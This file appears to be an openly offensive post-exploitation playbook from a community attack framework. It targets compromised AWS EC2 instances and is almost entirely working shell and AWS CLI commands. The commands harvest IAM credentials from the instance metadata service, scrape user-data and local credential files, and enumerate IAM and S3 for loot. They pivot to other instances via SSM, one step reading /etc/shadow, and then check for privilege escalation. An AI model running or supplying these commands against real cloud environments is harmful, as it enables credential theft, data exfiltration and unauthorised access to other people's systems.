# ===========================================================================
# Megaploit Community Playbook
# ===========================================================================
# Name        : cloud-pivot-aws
# Version     : 1.1
# Author      : megaploit-community
# Tested on   : Amazon Linux 2, Ubuntu 22.04 on EC2 (x86_64)
# Description : From an initial foothold on an EC2 instance, harvest IAM
#               credentials via the Instance Metadata Service (IMDSv1 and
#               IMDSv2), enumerate the AWS environment, and pivot laterally
#               to other instances via AWS Systems Manager (SSM).
#
# MITRE ATT&CK
# ------------
# T1552.005 Unsecured Credentials: Cloud Instance Metadata API
# T1078.004 Valid Accounts: Cloud Accounts
# T1087.004 Account Discovery: Cloud Account
# T1530     Data from Cloud Storage Object
# T1021.007 Remote Services: Cloud Services (SSM)
# T1619     Cloud Storage Object Discovery
# T1580     Cloud Infrastructure Discovery
#
# Variables
# ---------
#   ${SESSION} — session ID on the compromised EC2 instance
#
# Usage
# -----
#   community install playbook cloud-pivot-aws
#   resource community/playbooks/cloud-pivot-aws.rc
#
# Phases
# ------
#   1  IMDSv1 credential harvest
#   2  IMDSv2 credential harvest (if IMDSv1 blocked)
#   3  User-data scraping
#   4  Environment variable enumeration
#   5  IAM identity + account discovery
#   6  S3 bucket enumeration + loot
#   7  SSM lateral movement
#   8  IAM privilege escalation check
# ===========================================================================

session ${SESSION}

# ── Phase 1: IMDSv1 Credential Harvest ──────────────────────────────────────
# Step 1a — list available IAM roles
shell curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Step 1b — fetch credentials (replace ROLE_NAME with output of 1a)
shell curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
shell curl -sf http://169.254.169.254/latest/meta-data/instance-id
shell curl -sf http://169.254.169.254/latest/meta-data/placement/region
shell curl -sf http://169.254.169.254/latest/meta-data/public-ipv4

# ── Phase 2: IMDSv2 Harvest (if IMDSv1 is blocked) ──────────────────────────
shell TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# ── Phase 3: User-Data Scraping ──────────────────────────────────────────────
# User-data scripts often contain bootstrap credentials, database passwords, etc.
shell curl -sf http://169.254.169.254/latest/user-data
shell TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data

# ── Phase 4: Environment Variables + Config Files ───────────────────────────
shell env | grep -iE "aws|key|secret|token|password|credential"
shell cat ~/.aws/credentials 2>/dev/null
shell cat ~/.aws/config 2>/dev/null
shell find / -maxdepth 5 -name ".env" -o -name "*.env" 2>/dev/null | xargs grep -liE "AWS|SECRET" 2>/dev/null
shell find / -maxdepth 5 -name "*.conf" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | xargs grep -liE "aws_access|aws_secret" 2>/dev/null | head -10

# ── Phase 5: IAM Identity + Account Discovery ───────────────────────────────
shell aws sts get-caller-identity 2>/dev/null
shell aws iam list-users --output table 2>/dev/null
shell aws iam list-roles --output table 2>/dev/null
shell aws iam list-groups --output table 2>/dev/null
shell aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress,PublicIpAddress,State.Name,Tags[?Key==`Name`].Value|[0]]' --output table 2>/dev/null

# ── Phase 6: S3 Bucket Discovery + Loot ─────────────────────────────────────
shell aws s3 ls 2>/dev/null
shell aws s3api list-buckets --query 'Buckets[*].Name' 2>/dev/null
# Enumerate first 50 objects in each bucket — replace BUCKET_NAME
shell aws s3 ls s3://BUCKET_NAME --recursive 2>/dev/null | head -50

# ── Phase 7: SSM Lateral Movement ───────────────────────────────────────────
shell aws ssm describe-instance-information --query 'InstanceInformationList[*].[InstanceId,IPAddress,PlatformName,ComputerName]' --output table 2>/dev/null
# Execute on target — replace TARGET_INSTANCE_ID
shell aws ssm send-command --instance-ids "TARGET_INSTANCE_ID" --document-name "AWS-RunShellScript" --parameters "commands=[\"id\",\"whoami\",\"hostname\",\"cat /etc/shadow 2>/dev/null | head -5\"]" --output text 2>/dev/null

# ── Phase 8: IAM Privilege Escalation Check ─────────────────────────────────
# Check if current identity can create new admin users (replace ACCOUNT_ID and USER)
shell aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/USER --action-names iam:CreateUser iam:AttachUserPolicy iam:PutUserPolicy iam:CreateAccessKey --output table 2>/dev/null

# ── Report ───────────────────────────────────────────────────────────────────
loot list
